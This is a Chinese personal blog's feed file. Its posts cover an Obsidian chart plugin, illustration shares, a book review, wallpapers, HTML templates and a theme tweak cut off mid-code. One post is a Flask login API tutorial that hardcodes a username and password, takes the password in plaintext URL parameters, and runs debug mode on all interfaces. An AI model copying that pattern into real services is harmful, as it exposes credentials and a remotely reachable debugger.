src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/oc-plugin-reverse-1024x339.gif"></p><h3 id="Display"><a href="#Display" class="headerlink" title="Display"></a>Display</h3><ul><li><strong>功能</strong>：控制是否显示水平网格线或垂直网格线。这两种网格线默认是显示的。如果要隐藏垂直方向网格线，则在 <code>Display</code> 前加 <code>x</code>，并将它设置为 <code>false</code>，如：<code>xDisplay: false</code>。如果要隐藏水平方向网格线，则在 <code>Display</code> 前加 <code>y</code>，并将它设置为 <code>false</code>，如：<code>yDisplay: false</code>。</li><li><strong>适用图型</strong>：折线图、柱状图</li><li><strong>数据类型</strong>：布尔</li><li><strong>取值</strong>：<code>true</code>, <code>false</code></li><li><strong>默认值</strong>： <code>true</code></li></ul><p>演示如下：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/oc-plugin-display-1024x339.gif"></p><h3 id="TickDisplay"><a href="#TickDisplay" class="headerlink" title="TickDisplay"></a>TickDisplay</h3><ul><li><strong>功能</strong>：控制是否显示 x 轴上的刻度标签或 y 轴上的刻度标签。这两种标签默认是显示的。如果要隐藏 x 轴上的刻度标签，则在 <code>TickDisplay</code> 前加 <code>x</code>，并将它设置为 <code>false</code>，如：<code>xTickDisplay: false</code>。如果要隐藏 y 轴上的刻度标签，则在 <code>TickDisplay</code> 前加 <code>y</code>，并将它设置为 <code>false</code>，如：<code>yTickDisplay: false</code>。</li><li><strong>适用图型</strong>：折线图、柱状图</li><li><strong>数据类型</strong>：布尔</li><li><strong>取值</strong>：<code>true</code>, <code>false</code></li><li><strong>默认值</strong>： <code>true</code></li></ul><p>演示如下：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/oc-plugin-tick-display-1024x327.gif"></p><h2 id="将表格转换为图形"><a href="#将表格转换为图形" class="headerlink" title="将表格转换为图形"></a>将表格转换为图形</h2><p>Obsidian-Charts 插件可以将表格直接装换为图形，这个功能还是很酷的。演示如下：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/oc-plugin-from-table-1024x294.gif"></p><h2 id="将图形转换为图片"><a href="#将图形转换为图片" class="headerlink" title="将图形转换为图片"></a>将图形转换为图片</h2><p>Obsidian-Charts 插件提供了一个将绘制的图形转化为图片的功能，这个也是比较适用的。具体操作请见下面的视频。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/oc-plugin-create-image-1024x585.gif"></p><h2 id="图形交互"><a href="#图形交互" class="headerlink" title="图形交互"></a>图形交互</h2><p>Obsidian-Charts 插件创建的所有图形都是可交互的。用户可以用鼠标与图形互动，示例如下：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/oc-plugin-interactive-1024x265.gif"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文介绍的内容可归纳为下面的导图，希望对您有帮助。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-29-808x1024.png"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> chart </tag>
            
            <tag> Obsidian </tag>
            
            <tag> 图形 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4.16pixiv插画分享</title>
      <link href="/1546.html"/>
      <url>/1546.html</url>
      
        <content type="html"><![CDATA[<p>全世界只有不到0.1%的人关注了我</p><p>你可真是个很特别的人~</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-3b6811a76b759c919c04872044014120.jpeg"></p><p>1.你永远不知道未来的你 会有什么样的人生 会和什么样的人在一起恋爱 吃的是几块钱的早餐 生活的是几线城市 会给父母怎样的回报 越努力越幸运 你的余生还很长 要坚强地走下去 要做一个优秀的女孩儿 对自己狠一点 逼自己努力 再过五年 你将会感谢今天发狠的自己 恨透今天懒情自卑的自己 既然认准一条路 那就坚持走下去 命运不会辜负每一个对自己认真而努力的人</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-6fe8988d958561a814d79314a43794b1.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-b2ccf91e5819ff6847a996eec5c92b3b.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-791765e486bc94c73959a8c726c58332.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-0f0a0e3a43933bddb255cf548ec89edc.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-b3098b399b5696722ee118b2ba49fc63.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-8b892d38d66a25f57e6f95c3f98002cf.jpeg"></p><p>2.我们总觉得自己还小 还能贪婪的享受所有美好 后来惊讶地发现自己不知从何开始 看得清糖衣里的炮弹 读得出微笑后的杀机 也懂得应付敷衍 逢场作戏 去面对好多自己 不曾想过要面对的事 表面上人畜无害 防身的刀却一直x在身后从未离手那一刻 我终于承认了成长这回事只是不知是好是坏.</p><p>3.不是所有女孩都梦想赚大钱 也不是所有女孩都想做女强人 但当体会过一次次被人肯定认可以后 当你知道自己除了等待还可以争取 当你经济独立自我创造安全感 当你学会了潇洒地笑 潇洒的活着 你会发现 自己爱自己比别人来爱你更有意</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-0bd5b1c4adb1ed435c33631b0dedaa64.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-0a0d0f8b3aa2211a8f93438f7cc78717.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-ca6710cb1125a8bc92622280250410e3.jpeg"></p><p>4.不管什么年纪 别辜负最好的自己！把每一句我不会“都改为我可以学” 把每一句我不敢“都改为我一定行” 尝试总比永远不敢开始要强.</p><p>5.心有所期 全力以赴 定有所成，不要假装努力因为结局不会陪你演戏，跨过星河 迈过月亮 去努力迎接更好的自己 ， 人生那么长，总要用力拼搏一次</p><p>6.生如蝼蚁当立鸿鹄之志，命薄似纸应有不屈之心。乾坤未定，你我皆是黑马。祝你飞黄腾达前程似锦。</p><p>7.总有一天你会明白 你的委屈要自己消化 你的秘密不能逢人就提起 真正能解脱自己的只能靠努力.</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-34e2cb1ec013dedb69f2c39a63281a95.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-d6db3c3484eefa0548c58ee945f0fea4.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-17bb16b0e27ce870256a20d82391b45f.jpeg"></p><p>8.对自己狠一点 逼自己努力 再过五年 你将会感谢今天发狠的自己 恨透今天懒憤自卑的自己 我始终相信一句话：只有自己足够强大 才不会被别人践踏.</p><p>9.有压力 但不要被压垮 迷茫但不要绝望 在冷言嘲笑中翻盘 成为别人的可望不可及 你真的努力过了才有资格说你拼过 你可以打败我 但永远也别想让我求饶 生命本该有意义 我们绝不是白来一场 不要指望谁会陪你一辈子 没光的时候连影子都会离开你.</p><p>10.你可以在夜晚里崩溃痛哭 但我希望天一亮你又能顶住来自四面八方的压力 继续生活.</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-26f37079d3c75feddbf64d2e580087d9.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-3229e153eed7f43d53d030cb0631954d.jpeg"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-9434e058e648303bebf45c082612e057.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-bcfc5b98fc5411179af09d0630be60bc.jpeg"></p><p>这期还满意吗❤</p>]]></content>
      
      
      <categories>
          
          <category> 山海图册 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 壁纸 </tag>
            
            <tag> p站 </tag>
            
            <tag> 分享 </tag>
            
            <tag> 插画 </tag>
            
            <tag> 二次元 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用python制作api登录接口</title>
      <link href="/1325.html"/>
      <url>/1325.html</url>
      
        <content type="html"><![CDATA[<p>使用Python实现一个简单的接口服务，可以通过get、post方法请求该接口，拿到响应数据</p><h2 id="创建一个login-py文件"><a href="#创建一个login-py文件" class="headerlink" title="创建一个login.py文件"></a>创建一个login.py文件</h2><p>写入以下代码</p><p>[hidecontent type&#x3D;”reply” desc&#x3D;”隐藏内容：评论后查看”]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import flask,json</span><br><span class="line">from flask import request</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">flask: seb框架，通过flask提供的装饰器@server.route()将普通函数转换为服务</span><br><span class="line">登录接口，需要传入url,username,passwd</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">#创建一个服务，把当前这个python文件当做一个服务</span><br><span class="line">server = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">#server.route()可以将普通函数转变为服务　登录接口的路径、请求方式</span><br><span class="line">@server.route(&#x27;/login&#x27;,methods=[&#x27;get&#x27;,&#x27;post&#x27;])</span><br><span class="line">def login():</span><br><span class="line">    #获取通过url请求传参的数据</span><br><span class="line">    username = request.values.get(&#x27;name&#x27;)</span><br><span class="line">    #获取url请求传的密码，明文</span><br><span class="line">    pwd=request.values.get(&#x27;pwd&#x27;)</span><br><span class="line">    #判断用户名、密码都不为空，如果不传用户名、密码则username和pwd为None</span><br><span class="line">    if username and pwd:</span><br><span class="line">        if username == &#x27;gjcloak&#x27; and pwd == &#x27;123456&#x27;:</span><br><span class="line">            resu=&#123;&#x27;code&#x27;:200,&#x27;message&#x27;:&#x27;登录成功&#x27;&#125;</span><br><span class="line">            #将字典转换为Json串，json是字符串</span><br><span class="line">            return json.dumps(resu,ensure_ascii=False)</span><br><span class="line">        else:</span><br><span class="line">            resu=&#123;&#x27;code&#x27;:1010,&#x27;message&#x27;:&#x27;账号密码错误&#x27;&#125;</span><br><span class="line">            return json.dumps(resu,ensure_ascii=False)</span><br><span class="line"></span><br><span class="line">    else:</span><br><span class="line">        resu=&#123;&#x27;code&#x27;:1011,&#x27;message&#x27;:&#x27;参数不能为空&#x27;&#125;</span><br><span class="line">        return json.dumps(resu,ensure_ascii=False)</span><br><span class="line"></span><br><span class="line">if __name__== &#x27;__main__&#x27;:</span><br><span class="line">    server.run(debug=True,port = 8888,host=&#x27;0.0.0.0&#x27;)</span><br><span class="line">    #指定端口,host,0.0.0.0代表不管几个网卡，任何ip都可访问</span><br></pre></td></tr></table></figure><h2 id="执行以上代码，测试一下效果"><a href="#执行以上代码，测试一下效果" class="headerlink" title="执行以上代码，测试一下效果"></a><strong>执行以上代码，测试一下效果</strong></h2><p>我这里反代了127.0.0.1:8888</p><p>1、正确的用户名　正确的密码 </p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-19.png" alt="image"></p><p>2、密码为空</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-20.png" alt="image"></p><p>3、正确的用户名，错误的密码</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-21.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> python </tag>
            
            <tag> api </tag>
            
            <tag> 接口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>变化的世界 不变的原则 ——《高效能人士的七个习惯》</title>
      <link href="/1311.html"/>
      <url>/1311.html</url>
      
        <content type="html"><![CDATA[<p>其实不是你询问生命的意义何在，而是生命正提出质疑，要求你回答存在的意义为何。</p><p>这是一本好书，总结论述了七个习惯，或者说是七个信条，不仅仅对于高效能人士有价值，也是人生自我修炼的信条，是非常精粹和正确的人生道理。它表达的是一种新的思想水平，基于原则的思维定式。这种新的思想水平强调以原则为中心，以品德为基础，要求“由内而外”地实现个人效能和人际效能。作者对于“由内而外”的定义是从自身做起，甚至更彻底一些，从自己的内心做起，包括自己的思维定式、品德操守和动机。这种思维模式我现在只是有点肤浅的理解，而把这种思想应用到实际生活中是我将要追求的。</p><p>本书探讨了七个习惯</p><p>习惯一是<strong>积极主动</strong>。现在的大部分关于成功学的书籍都不约而同的强调积极主动的态度是成功的必要条件，看来这需要下苦功来练习。<br>习惯二是<strong>以终为始</strong>。以终为始说明在做任何事之前，都要先认清方向。这样可以对目前的处境了如指掌，从而不至于在追求目标的过程中误入歧途，白费工夫。因为很多人功成名就之后，反而感到空虚，发现自己牺牲了许多更宝贵的东西。这让我想到以色列国第三任国王所罗门，在他晚年的时候他似乎以一种怀疑和略微消极的论调写了《传道书》这卷书，在开篇的第一章第二节写到“虚空的虚空，虚空的虚空，凡事都是虚空。”当时以色列国正处于鼎盛时期，但他却高呼虚空。他尝试一切的追求，并取得了极大的成就，但他在写这卷书时，发现除了上帝以外，没有什么可以令他快乐。所以对他来说敬拜上帝才是他心中真正渴望的成功，其他的都是虚空。对于我们来说也需要明确真正的目标，然后才好勇往直前，坚持到底，实践使命。<br>习惯三是<strong>要事第一</strong>，就是要分清哪些是最重要的事，全身心处理好。<br>习惯四是<strong>双赢思维</strong>。它建立在美国人双赢、共同受益的理念基础之上。<br>习惯五是<strong>知彼解己</strong>。<br>习惯六是<strong>统合综效</strong>，指的是创造式的合作，实现1+1&gt;2。<br>习惯七是<strong>不断更新</strong>，指的是如何在四个基本生活面，包括身体、精神、智力、社会或情感中，不断更新自己。这七个习惯很值得我们去追求实践。</p><p>今天的我们是由无数个过去组成的，我们要想有所突破，就要修正既定的轨迹，像萨特在自传中写道：“如果一个人无法改变自己的思想构造，就永远无法改变现实，也永远不可能取得进步”。让我们先改变我们的思想，然后让思想来决定行动，行动决定习惯，习惯塑造性格。一个人有了优秀的性格，离成功也就不远了。</p><p>本书在其开头部分就写到“当我们环顾四周，审视内心，发现因追求速成特效反而制造了许多问题之后才会了解有些根本的问题不能以肤浅的方式解决。因此我们需要更深入的新思想标准。也就是一套正确的行为准绳，引导我们解决根本问题、追求圆满的人生。这种新的思维标准，也就是高效能人事的七个习惯，它强调以原则为中心，以品德为基础，以能达到个人效能和人际效能的由内而外的修炼。”</p><h3 id="习惯一、积极主动——个人愿景的原则"><a href="#习惯一、积极主动——个人愿景的原则" class="headerlink" title="习惯一、积极主动——个人愿景的原则"></a>习惯一、积极主动——个人愿景的原则</h3><p>人类具有自我觉察的能力，这是与动物的根本区别。人类是环境与制约作用的产物。有人认为人的意志力是无法克服社会制约的，这包括三种论调：基因决定论，心理决定论和环境决定论。不容否认这三种说法都是有其足以立论的基础的。但是这些观点基本上来自于对动物的研究，而人却是具有主观的能动性的。</p><p>人就其本质来说对环境是具有主动性的而非完全的对环境作出消极被动的反映，人能够以主动的行动去创造有利的环境。采取主动并不一定强求，并不一定会具有侵略性，对于一个能够冷静思考、具有严密推理能力的人来说这意味着对规律的顺应。从个人的指导思想上来说这是不去逃避自己开创前途的责任。对于一个具有主动性的人来说他能够以实际行动去追求自己的目标，而不是守株待兔。然而积极主动不是蛮干，对于力所不及的事情能够冷静对待具体分析泰然处之，对于力所能及的事情则应全力以赴。</p><h3 id="习惯二、以终为始——自我领导的原则"><a href="#习惯二、以终为始——自我领导的原则" class="headerlink" title="习惯二、以终为始——自我领导的原则"></a>习惯二、以终为始——自我领导的原则</h3><p>人都有自我的期许，这种期许或许很明确或许很模糊。在人生的不同阶段又有不同的期许。而这里讲的是人生真正渴望的目标。人在社会中生活很自然地会以某种社会认同的标准来作为自我期许的目标，比如职务、职称、收入水平、社会声望等等。然而这真的是最渴望的吗？应该说这只是标志而非本质，也许本质正如奥斯特洛夫斯基所说的“不因碌碌无为而羞耻、也不因虚度年华而悔恨”吧。但人生的目标终究还是会需要某些标志的，只是不要把标志当成目标本身就好。</p><p>为此本书的作者谈到了两次创造的理论，即所有事务都要经历心智的第一次创造和实践的第二次创造。做任何事情都要先在心中进行构思，然后在此指导下进行实践。因此认定自我目标就显得极其重要了。一旦确定了自身努力的目标与方向，接下来就是如何在日常的工作生活中以此为归依而实践。韩非子曾说“非知之难，处知则难”如何实现自我管理，在实践中不迷失目标就显得十分重要了。这就涉及到自我领导和自我管理的问题，自我领导就是确定并保持目标，可见确定了努力的目标只是在部分上解决了自我领导的问题，接着要做的就是保持这一目标。同时还要努力进行自我管理，在纷繁芜杂的日常工作和生活中不迷失自己路径是一件很不容易的事情。</p><h3 id="习惯三、要事第一——自我管理的原则"><a href="#习惯三、要事第一——自我管理的原则" class="headerlink" title="习惯三、要事第一——自我管理的原则"></a>习惯三、要事第一——自我管理的原则</h3><p>要事第一是一个显而易见的道理，然而何为要事？记得一部小说中曾经这样描写某个公司老板：“他总是跳着脚从一个危机冲向另一个危机”，危机就一定是要事吗？看来未必。这就涉及到管理，如何进行管理，如何把握重点是提高效能的关键。集中精力于重点，那么就需要对其余部分放手，作为领导就是要授权；作为一般工作人员就是要分轻重缓急。然而我想任何事情都不会在短时间内完全认识清楚，那么就有一个对重点的再确认的过程，海尔的老总张瑞敏在一个电视节目中曾经谈到他最重视的事情是重复出现的问题，因为一旦某个问题重复出现就说明这里存在着某种结构性的问题。我想这充分的证明了对于日常事务的重点管理。</p><h3 id="习惯四、双赢思维——人际领导的原则"><a href="#习惯四、双赢思维——人际领导的原则" class="headerlink" title="习惯四、双赢思维——人际领导的原则"></a>习惯四、双赢思维——人际领导的原则</h3><p>在日常生活中无论是谁都需要自我确认和自我满足，人们往往更重视自我的感受而忽略了他人。这在工作中对于协作会产生不利影响。作者归纳了人际关系的六种模式：利人利己、损人利己、损己利人、两败俱伤、独善其身、好聚好散，其中独善其身是指在不损害他人利益的情况下为自己获得利益；好聚好散是说如果无法找到双方都能接受的方案就各自好聚好散。</p><p>在通常情况下，问题都来源于体系而不是人，人们的选择在很大程度上环境和体系作用的结果。而这个体系的构建总的来说作者语焉不详。</p><h3 id="习惯五、知己知彼——将心比心交流的原则"><a href="#习惯五、知己知彼——将心比心交流的原则" class="headerlink" title="习惯五、知己知彼——将心比心交流的原则"></a>习惯五、知己知彼——将心比心交流的原则</h3><p>首先寻求了解对方，然后再让对方对自己有正确的认识。“知己知彼”这句由孙子兵法而来的成语似乎有些火药味，我想其实就是正确的沟通。知彼的首要条件就是真正的倾听，了解对方的关切，理解这种关切，站在讲话者的角度看待整个问题。然而这里面必须认识到这种理解不是赞同，甚至不是同情。在这个过程中不能丧失自己的立场，而是深入了解对方，给对方倾诉的机会。在倾听对方的过程中，倾听者往往会做出四种反应：1价值判断：对其意见只有接受或不接受两种态度。2追根究底：以自己的价值观去探查别人的隐私。3好为人师：以自己的经验提供忠告。4想当然：根据自己的行为与动机去衡量别人的行为与动机。这四种反应难以做到有效沟通。真正的有效沟通应包含三个阶段：重复语句，使对方专心聆听；加入解释，将目的动机等纯用自己的语言来表达；渗入个人的意志，既加以解释又带有感情；在表达自己的过程中要遵循三个阶段：品格、情感、理性。而单纯的直接理性说教未必具有说服力。</p><h3 id="习惯六、综合综效——创造性合作的原则"><a href="#习惯六、综合综效——创造性合作的原则" class="headerlink" title="习惯六、综合综效——创造性合作的原则"></a>习惯六、综合综效——创造性合作的原则</h3><p>精髓就在于<strong>尊重差异，取长补短</strong>。</p><p>人们在沟通过程中存在着三个层次：自我防卫、彼此尊重、综合综效。人们总是本能地去捍卫自己的观点，在这个过程中往往会自觉或不自觉地拒绝接受别人的意见和建议，这很常见。更具有沟通技巧的人会彼此尊重但仍然存在着某种抵触心理不愿意接受别人的意见或建议。而本书作者主张的是综合综效，敞开胸怀接纳一切稀奇古怪的想法同时也贡献自己的一孔之见。应该认识到如果某人与我意见不一致他必定有他的道理，甚至可以说他一定体会到了某种我没有体会到奥妙，这值得去了解。中国古人也说“刍荛之言，圣人择焉”我不是圣人，对方也不是一个牧童樵夫他的看法必然是值得了解的。</p><p>世界之所以丰富多彩就是因为存在差异因此要尊重差异。与人合作最重要的就是要重视不同个体的不同心理、情绪和智能，以及个人眼中所见到的不同世界。</p><h3 id="习惯七、不断更新——平衡的自我更新原则"><a href="#习惯七、不断更新——平衡的自我更新原则" class="headerlink" title="习惯七、不断更新——平衡的自我更新原则"></a>习惯七、不断更新——平衡的自我更新原则</h3><p>人是有惰性的，任何事情都要坚持下去而且要不断更新自己，磨练自己，从身体、精神、心智和社会情感等四个方面进行积累增进修养。</p><p>儒家思想家们认为，才胜德则为小人，德胜才则为君子。这里的德就是良知，我们应该在良知的指引下行事。良知是人类明辨是非的能力，一个没有良知却有掌握着力量的人必将是社会的祸害。</p><p>总的来说这本书中的七个习惯是一个整体，它们相辅相成，既讲到了个人要全力以赴确立目标，进行个人修炼并由依赖转向独立，从而实现“个人成功”，也讲到了要通过建立共赢，换位沟通，集思广益，促进团队沟通与合作。而不断更新更是涵盖了前面的六个习惯，督促我们从身心开始完善。其中要事第一的习惯、积极主动的态度不断更新的创造对我的触动最大。</p>]]></content>
      
      
      <categories>
          
          <category> 书籍 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 项目管理 </tag>
            
            <tag> 史蒂芬·柯维 </tag>
            
            <tag> 高效能人士的七个习惯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bing Wallpaper (2021-03)</title>
      <link href="/1269.html"/>
      <url>/1269.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cn.bing.com/th?id=OHR.SwordFern_EN-US7523587413_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.Reynisfjara_EN-US7429542895_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.JeffersonCherries_EN-US7147255858_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.MadHares_EN-US7045432576_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.MTCradle_EN-US6777988781_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.GoldMine_EN-US9932494168_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.HumpbackMom_EN-US9862782184_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.LoftedMadagascar_EN-US9720623596_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.TuskegeeAirmen_EN-US9643365119_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.HallesWood_EN-US9545891830_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.ParnidisSundial_EN-US9491593439_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.MagneticIsland_EN-US9412695841_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.MtEtna_EN-US8761813954_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.Inisheer_EN-US8680602205_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.BifengxiaPanda_EN-US8585443782_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.MassapequaOwl_EN-US8469635086_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.LyonAstronomical_EN-US8367377789_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.Rhododendron_EN-US8246366006_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.AztecNewYear_EN-US8147148173_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.CapePerpetua_EN-US1381606733_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.HarrietTubman_EN-US1054261891_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.RollingHills_EN-US0930573674_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.NotoriousRBG_EN-US0765557260_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.Wakodahatchee_EN-US0593250314_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.PadarIsland_EN-US0491336626_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.MinasdeRioTinto_EN-US0408244151_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.Comma_EN-US0289421685_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.WWDLions_EN-US0205102042_UHD.jpg"></p><p><img src="https://cn.bing.com/th?id=OHR.VolcanoLlaima_EN-US0109967122_UHD.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 山海图册 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bing </tag>
            
            <tag> Wallpaper </tag>
            
            <tag> 每日一图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ethereal HTML5+CSS</title>
      <link href="/4d38473f.html"/>
      <url>/4d38473f.html</url>
      
        <content type="html"><![CDATA[<p>效果图如下：</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-16-1024x498.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-17-1024x495.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-18-1024x497.png"></p><p><strong>演示站点</strong></p><p><a href="https://v1.gjcloak.top/ethereal/">演示站点</a></p><p>Ethereal</p><p><a href="https://wwoi.lanzouf.com/iMIKK0sdnpmh">下载</a></p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分享 </tag>
            
            <tag> CSS </tag>
            
            <tag> HTML5 </tag>
            
            <tag> 源码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>big-picture 大图流 HTML5+CSS</title>
      <link href="/5c3a9476.html"/>
      <url>/5c3a9476.html</url>
      
        <content type="html"><![CDATA[<p>效果图如下</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/%E7%BD%91%E9%A1%B5%E6%8D%95%E8%8E%B7_8-4-2023_92454_html5up.net_-scaled.jpeg"></p><p><strong>演示站点</strong></p><p><a href="https://v1.gjcloak.top/big-picture/">演示站点</a></p><p>big-picture</p><p><a href="https://wwoi.lanzouf.com/ibyRm0sdmyib">下载</a></p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分享 </tag>
            
            <tag> CSS </tag>
            
            <tag> HTML5 </tag>
            
            <tag> 源码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>子比go外链修改</title>
      <link href="/1250.html"/>
      <url>/1250.html</url>
      
        <content type="html"><![CDATA[<h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-15.png" alt="image"></p><h2 id="食用教程"><a href="#食用教程" class="headerlink" title="食用教程"></a>食用教程</h2><p>在子比目录下找文件，go.php 文件</p><p>再把我下面这个代码粘贴进去然后保存即可</p><p>[hidecontent type&#x3D;”logged” desc&#x3D;”隐藏内容：登录后可查看”]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 